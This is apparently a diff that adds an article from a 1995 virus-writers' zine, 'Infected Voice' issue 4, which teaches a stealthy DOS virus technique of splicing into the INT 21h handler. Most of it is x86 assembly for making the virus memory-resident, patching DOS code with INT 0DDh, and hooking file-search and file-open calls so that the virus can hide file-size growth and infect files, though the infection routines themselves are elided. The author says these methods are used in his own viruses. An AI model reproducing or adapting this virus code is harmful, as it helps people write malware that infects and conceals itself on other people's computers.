@@ -1,0 +1,189 @@
+ÛßßßßßßßßßßßßßßßÛ  ß                                        ß          ÛÛßÛÛßÛÛ
+Û STEALTH group Û° Û ÛßÜ Ûßß Üßß Üßß ßÛß Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß Üßß  ÛÛ ßß ÛÛ
+Û   presents    Û° Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û  ßÛßß  ÛÛÛÛÛ ÛÛ
+ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ° Þ Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜ  ÛÛÛÛÛÜÛÛ
+ °°°°°°°°°°°°°°°°°                                                     JAN 1995
+
+  INFECTED VOICE. Issue 4. January 1995. (C) STEALTH group, Kiev 148, Box 10.
+  ---------------------------------------------------------------------------
+
+    Let me introduce the ÜÜÜÜ NON-STANDARD WAY OF INT 21 INTERCEPTION ÜÜÜÜ.
+It means not setting INT 21h in the vector table and the presence of the
+classic JMP FAR ORIGINAL at the end of our handler.
+We'll replace part of INT 21h handler with code, passing the process to virus'
+handler. These bytes consist of "INT 0DDh" - it takes only two bytes and is
+easier to use than CALL FAR. The virus emulates "old" bytes right before
+passing the process back. Replaced bytes must be a 2 byte instruction, not
+any JUMPs. It will be easy to execute and difficult to restore the real
+handler back. 
+  This way or similar ways of INT 21h interception are known as splicing.
+Splicing is a field of experiment, which isn't complete yet. One variation
+- the simplest is a subject of our article. It was found in DIR-2 virus and
+is simpler then the classic. The classic method is described in an article of
+the present magazine.
+  Before starting the code here is our disclaimer - pieces of code, listed
+below, work on PC-DOS 3.30, MS-DOS 5.0. We didn't test it on other versions,
+so it can hang anywhere. But this code is not a utility, it's only an idea
+so try it out.
+
+    For memory residence do the following steps:
+     1) decrease MCB of executing program by 1000h paragrafs(65536 bytes );
+	(for COM file)
+     2) allocate block ( 48h ); 
+     3) Set block owner : self;
+     4) write virus body to block;
+     5) intercept int 21h
+
+Thus we're hiding inside RAM. It is preferable because "CTRL+L" in Norton
+Commander will give us the habitual "655.360 bytes Total Memory"
+
+* Real INT 21h detecting algorithm was taken from DIR-Virus.
+	    
+;--- This routine shows installer and splicing.
+;--- call it simply:  "call setup"
+setup:
+		pop     si
+		push    si
+		sub     si,4    ; offset between virstart and proc.start
+		push    es
+		mov     ah,52h
+		int     21h
+		mov     di,es:[bx+4]    ; di = Ptr to DOS' List of Lists
+					
+		les     di,es:[di-4]     
+find21_1:
+		dec     di
+		cmp     word ptr es:[di-2],0E18Ah      ; hex for "mov ah,cl"
+		jne     find21_1
+		mov     word ptr ds:[Real_off21+si],di ; Find original DOS
+		mov     word ptr ds:[Real_seg21+si],es ; handler's address
+		pop     es
+
+		mov     bx,cs
+		mov     ax,es           ; es - PSP segment
+		sub     bx,ax
+		add     bx,1000h
+		mov     ah,4Ah
+		call    int21
+		jnc     standart
+;--- installer to memory
+		mov     ax,es
+		dec     ax
+		mov     ds,ax
+		mov     bx,ds:[0003]    ; allocated paragraphs
+		sub     bx,lenPar+1     ; required memory (in paragraphs)
+		mov     ah,4Ah
+		call    int21
+;--- allocating memory and moving to there.
+standart:
+		mov     ah,48h        ; gettin block to ax
+		mov     bx,lenPar
+		call    int21
+		jc      memoryErr
+		mov     es,ax
+SetOwnerPara:
+		dec     ax            ; ax=NewSeg
+		mov     ds,ax
+		mov     word ptr ds:[0001],es      ; owner - we are
+
+		xor     di,di
+		push    cs
+		pop     ds
+		mov     cx,(offset lengthVirus-correct+16)/2 ; virlen in words
+		rep     movsw                                   
+		push    es      ; ds=es=virus segment in RAM
+		pop     ds
+		mov     dx,offset int21Entry-correct
+		mov     ax,25DDh                ; set int DD
+		int     21h
+;--- As DS is a virus segment and Real_off21 was run until copying to RAM
+;---                          ==> its value was keeped twice
+		lds     si,dword ptr ds:Real_off21
+findJa1:
+		lodsb
+		cmp     al,0CDh         ;       int ??
+		je      foundJa1
+		cmp     al,077h         ; looking for "ja xx" and replacing
+					; it with "int DD"
+		jne     findJa1
+foundJa1:
+		lea     dx,[si+6]
+		mov     ax,25DEh        ; int DE (I reccomend to use instead
+		call    int21           ; DOS 40h calling)
+		dec     si
+		mov     [si],0DDCDh     ; here's replacing
+		ret
+
+;--- int 21 for call by program
+int21           proc
+		pushf
+		cli
+		db      9Ah
+Real_off21      equ     $-correct
+		dw      ?
+Real_seg21      equ     $-correct
+		dw      ?
+		ret
+int21           endp
+
+;--- int 21 for interrupt handling
+int21Entry:
+		pushf
+;--- filtering to handle our functions
+		cmp     ah,4Eh
+		je      hide
+		cmp     ah,4Fh
+		je      hide
+		cmp     ah,3Dh
+		je      infected
+		cmp     ah,43h
+		je      infected
+exit:
+		popf
+		ja      mov_al_0 ; Emulation of instruction, which was
+				 ; changed to INT 0DDh
+				 ; This command presents in all DOS handlers 
+				 ; and means jmp on non-existing function
+				
+		iret             ; go to DOS
+mov_al_0:
+		xor     al,al
+		add     sp,6     ; pop off 3 registers from stack
+		iret
+hide:
+		push    si di bx es
+
+;--- here's the tests, is it necessary to hide length growth.
+;               . . . . .
+;               . . . . .
+;               . . . . .
+;               . . . . .
+;               . . . . .
+findOk:
+		pop     es bx di si
+		add     sp,8            ; pop off 4 registers from stack
+		clc
+popArea:
+;--- exit without real DOS calling
+		retf    2
+findBad:
+		pop     es bx di si
+		add     sp,8            ; pop off 4 registers from stack
+		stc
+		jmp     short popArea
+infected:
+		push    ax bx cx dx ds es si di
+;--- checks for already infected and infecting of not-infected files
+;               . . . . .
+;               . . . . .
+;               . . . . .
+;               . . . . .
+;               . . . . .
+;               . . . . .
+;--- restore registers
+		pop     di si es ds dx cx bx ax
+		jmp     exit
+
+	Described methods are successfully used in author's viruses.
+
+ Good luck! Populizer.  6-6-66. 6:06:06
